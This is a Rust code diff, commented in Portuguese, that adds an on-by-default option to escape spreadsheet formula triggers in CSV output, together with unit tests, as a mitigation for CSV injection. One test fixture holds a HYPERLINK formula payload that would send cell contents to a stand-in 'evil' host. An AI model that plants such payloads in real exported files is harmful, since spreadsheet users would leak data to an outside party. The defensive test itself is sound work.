@@ -27,6 +27,19 @@ fn parse_delimiter(delim: &str, default: u8) -> u8 {
     delim.bytes().next().unwrap_or(default)
 }
 
+/// Detecta se um campo começa com caractere que dispara interpretação de
+/// fórmula em Excel/Sheets/Calc. Inclui os vetores clássicos (`=`, `+`, `-`, `@`)
+/// e as variações via tab/CR que alguns parsers tratam como continuação.
+///
+/// Ver [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection).
+#[inline]
+fn needs_formula_escape(s: &str) -> bool {
+    matches!(
+        s.bytes().next(),
+        Some(b'=') | Some(b'+') | Some(b'-') | Some(b'@') | Some(b'\t') | Some(b'\r')
+    )
+}
+
 fn csv_reader<R: std::io::Read>(delim: u8, has_headers: bool, reader: R) -> csv::Reader<R> {
     csv::ReaderBuilder::new()
         .delimiter(delim)
@@ -47,6 +60,10 @@ fn csv_writer<W: std::io::Write>(delim: u8, writer: W) -> csv::Writer<W> {
 /// `writer`. Genérico em `Read`/`Write` — qualquer fonte que implemente
 /// `Read` serve (arquivo, `&[u8]`, `Cursor<Vec<u8>>`, socket).
 ///
+/// Quando `escape_formulas` é `true`, campos de saída que começam com `=`,
+/// `+`, `-`, `@`, `\t` ou `\r` recebem um prefixo `'` para neutralizar
+/// CSV formula injection caso o output seja aberto em Excel/Sheets/Calc.
+///
 /// Propaga erros de leitura (record mal formado) e escrita. Para o caso de
 /// processamento por chunks em paralelo, onde queremos resiliência por chunk,
 /// use diretamente o loop de `process_chunks_impl` que faz continue/break
@@ -60,6 +77,7 @@ pub fn process_records<R: std::io::Read, W: std::io::Write>(
     output_delimiter: u8,
     skip_header: bool,
     columns: &[ColumnConfig],
+    escape_formulas: bool,
 ) -> Result<(i64, i64, i64), String> {
     let max_out = max_output_index(columns);
     let mut rdr = csv_reader(input_delimiter, skip_header, reader);
@@ -72,8 +90,9 @@ pub fn process_records<R: std::io::Read, W: std::io::Write>(
     for result in rdr.records() {
         let record = result.map_err(|e| e.to_string())?;
         input_count += 1;
-        let written = transform_and_write(&record, columns, &mut out_row, &mut wtr)
-            .map_err(|e| e.to_string())?;
+        let written =
+            transform_and_write(&record, columns, &mut out_row, &mut wtr, escape_formulas)
+                .map_err(|e| e.to_string())?;
         if written {
             output_count += 1;
         }
@@ -86,11 +105,17 @@ pub fn process_records<R: std::io::Read, W: std::io::Write>(
 /// Aplica o layout numa record e escreve a saída se for válida.
 /// Retorna `Ok(true)` se a linha foi escrita, `Ok(false)` se foi descartada
 /// por um validator, e `Err` apenas se o writer CSV falhar.
+///
+/// Quando `escape_formulas` é `true`, campos que começam com caracteres
+/// interpretados como fórmula por planilhas (`=`, `+`, `-`, `@`, `\t`, `\r`)
+/// são prefixados com `'` antes da escrita. Mitiga CSV formula injection
+/// (OWASP) caso o CSV de saída venha a ser aberto em Excel/Sheets/Calc.
 fn transform_and_write<W: std::io::Write>(
     record: &csv::StringRecord,
     columns: &[ColumnConfig],
     out_row: &mut [String],
     wtr: &mut csv::Writer<W>,
+    escape_formulas: bool,
 ) -> csv::Result<bool> {
     for slot in out_row.iter_mut() {
         slot.clear();
@@ -107,6 +132,13 @@ fn transform_and_write<W: std::io::Write>(
             }
         }
         out_row[col.output_index].push_str(&transformed);
+    }
+    if escape_formulas {
+        for slot in out_row.iter_mut() {
+            if needs_formula_escape(slot) {
+                slot.insert(0, '\'');
+            }
+        }
     }
     wtr.write_record(out_row.iter())?;
     Ok(true)
@@ -165,6 +197,11 @@ impl FileProcessor {
     }
 
     /// Processa arquivo único aplicando layout. Retorna [input, output, invalid].
+    ///
+    /// `escape_formulas` previne CSV formula injection ao prefixar com `'`
+    /// campos de saída que começariam com `=`/`+`/`-`/`@`/`\t`/`\r`. Default
+    /// seguro: recomendado manter em `true` exceto para pipelines internos
+    /// onde o CSV de saída nunca será aberto em planilha.
     pub fn process_file_impl(
         &self,
         input_path: &str,
@@ -173,6 +210,7 @@ impl FileProcessor {
         output_delimiter: &str,
         skip_header: bool,
         columns_json: &str,
+        escape_formulas: bool,
     ) -> Result<Vec<i64>, String> {
         let columns = parse_columns(columns_json)?;
         let in_delim = parse_delimiter(input_delimiter, b';');
@@ -184,13 +222,22 @@ impl FileProcessor {
 
         let out_file = File::create(output_path).map_err(|e| e.to_string())?;
 
-        let (input, output, invalid) =
-            process_records(data, out_file, in_delim, out_delim, skip_header, &columns)?;
+        let (input, output, invalid) = process_records(
+            data,
+            out_file,
+            in_delim,
+            out_delim,
+            skip_header,
+            &columns,
+            escape_formulas,
+        )?;
 
         Ok(vec![input, output, invalid])
     }
 
     /// Processa todos os chunks em paralelo. Retorna [input, output, invalid] totais.
+    ///
+    /// Ver `process_file_impl` para a descrição de `escape_formulas`.
     pub fn process_chunks_impl(
         &self,
         dir: &str,
@@ -199,6 +246,7 @@ impl FileProcessor {
         output_delimiter: &str,
         skip_header: bool,
         columns_json: &str,
+        escape_formulas: bool,
     ) -> Result<Vec<i64>, String> {
         let columns = parse_columns(columns_json)?;
         let in_delim = parse_delimiter(input_delimiter, b';');
@@ -241,7 +289,13 @@ impl FileProcessor {
                         Err(_) => continue,
                     };
                     input_count += 1;
-                    match transform_and_write(&record, &columns, &mut out_row, &mut wtr) {
+                    match transform_and_write(
+                        &record,
+                        &columns,
+                        &mut out_row,
+                        &mut wtr,
+                        escape_formulas,
+                    ) {
                         Ok(true) => output_count += 1,
                         Ok(false) => {} // descartada por validator
                         Err(_) => break, // falha ao escrever
@@ -313,6 +367,7 @@ impl FileProcessor {
         output_delimiter: String,
         skip_header: bool,
         columns_json: String,
+        escape_formulas: Option<bool>,
     ) -> PhpResult<Vec<i64>> {
         self.process_file_impl(
             &input_path,
@@ -321,6 +376,7 @@ impl FileProcessor {
             &output_delimiter,
             skip_header,
             &columns_json,
+            escape_formulas.unwrap_or(true),
         )
         .map_err(Into::into)
     }
@@ -333,6 +389,7 @@ impl FileProcessor {
         output_delimiter: String,
         skip_header: bool,
         columns_json: String,
+        escape_formulas: Option<bool>,
     ) -> PhpResult<Vec<i64>> {
         self.process_chunks_impl(
             &dir,
@@ -341,6 +398,7 @@ impl FileProcessor {
             &output_delimiter,
             skip_header,
             &columns_json,
+            escape_formulas.unwrap_or(true),
         )
         .map_err(Into::into)
     }
@@ -474,7 +532,7 @@ mod tests {
         )
         .unwrap();
 
-        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns).unwrap();
+        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
         assert_eq!((i, o, inv), (2, 2, 0));
         assert_eq!(output, b"ALICE;30\nBOB;25\n");
     }
@@ -486,7 +544,7 @@ mod tests {
         let columns =
             parse_columns(r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#).unwrap();
 
-        let (i, o, inv) = process_records(input, &mut output, b';', b';', true, &columns).unwrap();
+        let (i, o, inv) = process_records(input, &mut output, b';', b';', true, &columns, true).unwrap();
         assert_eq!((i, o, inv), (1, 1, 0));
         assert_eq!(output, b"alice;30\n");
     }
@@ -498,7 +556,7 @@ mod tests {
         let columns =
             parse_columns(r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#).unwrap();
 
-        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns).unwrap();
+        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
         assert_eq!((i, o, inv), (2, 1, 1));
         assert_eq!(output, b"12345678909\n");
     }
@@ -512,10 +570,134 @@ mod tests {
         )
         .unwrap();
 
-        let (i, o, _) = process_records(input, &mut output, b';', b';', false, &columns).unwrap();
+        let (i, o, _) = process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
         assert_eq!((i, o), (1, 1));
         // Campo com delimitador embutido é re-quotado pelo csv::Writer.
         assert_eq!(output, b"1;\"SILVA; JUNIOR\";42\n");
+    }
+
+    // ===========================================================
+    // Formula escape (CSV injection mitigation)
+    // ===========================================================
+
+    #[test]
+    fn needs_formula_escape_triggers_on_dangerous_prefixes() {
+        assert!(needs_formula_escape("=1+1"));
+        assert!(needs_formula_escape("+CMD"));
+        assert!(needs_formula_escape("-2"));
+        assert!(needs_formula_escape("@SUM(1)"));
+        assert!(needs_formula_escape("\ttabbed"));
+        assert!(needs_formula_escape("\rcarriage"));
+    }
+
+    #[test]
+    fn needs_formula_escape_ignores_safe_values() {
+        assert!(!needs_formula_escape(""));
+        assert!(!needs_formula_escape("abc"));
+        assert!(!needs_formula_escape("123"));
+        assert!(!needs_formula_escape(" =leading space"));
+        assert!(!needs_formula_escape("a=b"));
+        assert!(!needs_formula_escape("ALICE"));
+    }
+
+    #[test]
+    fn process_records_escapes_formula_field_by_default() {
+        // Payload clássico de CSV injection. Com escape_formulas=true, o '='
+        // inicial recebe prefixo de aspa simples.
+        let input: &[u8] = b"1;=HYPERLINK(\"http://evil/?x=\"&A1,\"clique\")\n";
+        let mut output: Vec<u8> = Vec::new();
+        let columns =
+            parse_columns(r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#).unwrap();
+
+        let (i, o, _) =
+            process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
+        assert_eq!((i, o), (1, 1));
+
+        let out_str = std::str::from_utf8(&output).unwrap();
+        // O campo perigoso começa com `'=` (prefixo de neutralização).
+        // O csv::Writer quota o campo porque ele contém `"`.
+        assert!(
+            out_str.contains("'=HYPERLINK"),
+            "expected escaped formula, got: {}",
+            out_str
+        );
+    }
+
+    #[test]
+    fn process_records_escapes_all_dangerous_prefixes() {
+        // Cada linha cobre um trigger diferente: =, +, -, @
+        let input: &[u8] = b"=1+1\n+CMD\n-2\n@SUM(1)\nsafe\n";
+        let mut output: Vec<u8> = Vec::new();
+        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();
+
+        let (_, _, _) =
+            process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
+
+        let out_str = std::str::from_utf8(&output).unwrap();
+        // csv::Writer re-quota campos que começam com `'` porque não são
+        // caracteres especiais, mas pelos nossos padrões ficam sem quoting.
+        assert!(out_str.contains("'=1+1"));
+        assert!(out_str.contains("'+CMD"));
+        assert!(out_str.contains("'-2"));
+        assert!(out_str.contains("'@SUM(1)"));
+        assert!(out_str.contains("safe"));
+        // "safe" não deve ser prefixado
+        assert!(!out_str.contains("'safe"));
+    }
+
+    #[test]
+    fn process_records_does_not_escape_when_flag_off() {
+        // Opt-out explícito para pipelines internos onde a saída nunca vai
+        // para planilha.
+        let input: &[u8] = b"=1+1\n";
+        let mut output: Vec<u8> = Vec::new();
+        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();
+
+        process_records(input, &mut output, b';', b';', false, &columns, false).unwrap();
+
+        let out_str = std::str::from_utf8(&output).unwrap();
+        // O campo começa com '=' puro, sem prefixo.
+        assert_eq!(out_str, "=1+1\n");
+    }
+
+    #[test]
+    fn process_records_escapes_field_built_by_ops_chain() {
+        // Caso sutil: o campo de entrada é seguro, mas ops podem produzir
+        // uma saída perigosa. Ex.: strip_ddi removendo prefixo deixa '=' na
+        // frente. O escape deve olhar o resultado final, não o input.
+        let input: &[u8] = b"XX=malicious\n";
+        let mut output: Vec<u8> = Vec::new();
+        let columns =
+            parse_columns(r#"[{"in":0,"out":0,"ops":["strip_ddi:XX"]}]"#).unwrap();
+
+        process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
+
+        let out_str = std::str::from_utf8(&output).unwrap();
+        // Após strip_ddi, o campo vira "=malicious" — e deve ser escapado.
+        assert!(
+            out_str.contains("'=malicious"),
+            "expected escape after ops chain, got: {}",
+            out_str
+        );
+    }
+
+    #[test]
+    fn process_records_escape_does_not_break_validation() {
+        // Validation acontece ANTES do escape — o validator vê o valor real.
+        // Um CPF válido continua válido mesmo que depois do escape seu primeiro
+        // char vire uma aspa simples.
+        let input: &[u8] = b"12345678909\n";
+        let mut output: Vec<u8> = Vec::new();
+        let columns = parse_columns(
+            r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
+        )
+        .unwrap();
+
+        let (i, o, inv) =
+            process_records(input, &mut output, b';', b';', false, &columns, true).unwrap();
+        // Campo começa com '1' (dígito) — não é trigger, passa sem prefixo.
+        assert_eq!((i, o, inv), (1, 1, 0));
+        assert_eq!(output, b"12345678909\n");
     }
 
     #[test]
@@ -534,7 +716,7 @@ mod tests {
         let input: &[u8] = b"a\n";
         let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();
         let err =
-            process_records(input, FailingWriter, b';', b';', false, &columns).unwrap_err();
+            process_records(input, FailingWriter, b';', b';', false, &columns, true).unwrap_err();
         assert!(err.to_lowercase().contains("nope") || err.to_lowercase().contains("io"));
     }
 
@@ -561,6 +743,7 @@ mod tests {
                     {"in":0,"out":0,"ops":["trim","uppercase"]},
                     {"in":1,"out":1,"ops":["trim"]}
                 ]"#,
+                true,
             )
             .unwrap();
 
@@ -586,6 +769,7 @@ mod tests {
                 ";",
                 true,
                 r#"[{"in":0,"out":0,"ops":[]}]"#,
+                true,
             )
             .unwrap();
         assert_eq!(res[0], 2); // input_count exclui header
@@ -607,6 +791,7 @@ mod tests {
                 ";",
                 false,
                 r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
+                true,
             )
             .unwrap();
         assert_eq!(res, vec![2, 1, 1]);
@@ -635,6 +820,7 @@ mod tests {
                     {"in":1,"out":1,"ops":["uppercase"]},
                     {"in":2,"out":2,"ops":[]}
                 ]"#,
+                true,
             )
             .unwrap();
 
@@ -660,6 +846,7 @@ mod tests {
                 ";",
                 false,
                 r#"[{"in":1,"out":0,"ops":[]}]"#,
+                true,
             )
             .unwrap();
 
@@ -684,6 +871,7 @@ mod tests {
                 ";",
                 false,
                 r#"[{"in":0,"out":0,"ops":[]}]"#,
+                true,
             )
             .unwrap();
         assert_eq!(res[0], 2); // linha em branco fora do input_count
@@ -708,6 +896,7 @@ mod tests {
                 ";",
                 false,
                 r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
+                true,
             )
             .unwrap();
 
@@ -728,6 +917,7 @@ mod tests {
             ",",
             false,
             r#"[{"in":0,"out":0,"ops":["uppercase"]},{"in":1,"out":1,"ops":[]}]"#,
+            true,
         )
         .unwrap();
 
@@ -750,6 +940,7 @@ mod tests {
                 ";",
                 false,
                 r#"[{"in":0,"out":0,"ops":[]}]"#,
+                true,
             )
             .unwrap();
         assert_eq!(res, vec![1, 1, 0]);
@@ -824,6 +1015,7 @@ mod tests {
                     {"in":0,"out":0,"ops":[],"validate":"cpf"},
                     {"in":1,"out":1,"ops":["uppercase"]}
                 ]"#,
+                true,
             )
             .unwrap();
 
@@ -861,6 +1053,7 @@ mod tests {
                 ";",
                 true,
                 r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
+                true,
             )
             .unwrap();
 
